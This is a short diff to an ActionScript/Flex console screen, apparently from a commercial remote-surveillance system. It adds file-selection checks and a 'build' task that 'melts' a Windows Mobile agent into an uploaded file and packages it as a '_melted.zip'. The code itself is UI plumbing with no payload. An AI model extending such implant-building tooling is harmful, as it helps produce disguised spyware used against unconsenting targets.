@@ -5,11 +5,15 @@
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.task.controller.DownloadManager;
       import it.ht.rcs.console.utils.AlertPopUp;
       
       import locale.R;
       
+      import mx.core.UIComponent;
       import mx.managers.PopUpManager;
+      import mx.rpc.events.FaultEvent;
+      import mx.rpc.events.ResultEvent;
       
       private var fileReference:FileReference;
       
@@ -29,6 +33,11 @@
       private var uploadPopup:UploadPopup;
       private function create(event:MouseEvent):void
       {
+        if (currentState != 'fileSelected') {
+          AlertPopUp.show(R.get('SELECT_FILE'));
+          return;
+        }
+        
         fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
         fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
         fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
@@ -45,6 +54,21 @@
         
         var params:Object = {platform: 'winmo', binary: {demo: demo.selected}, melt: {input: event.data}, 'package': {type: 'remote'} };
         
+        params['factory'] = {_id: parentDocument.factory._id};
+        
+        var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_melted.zip'
+        
+        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
+      }
+      
+      private function onSuccess(e:ResultEvent):void
+      {
+        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+      }
+      
+      private function onFailure(e:FaultEvent):void
+      {
+        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
       }
       
       private function onUploadError(event:Event):void
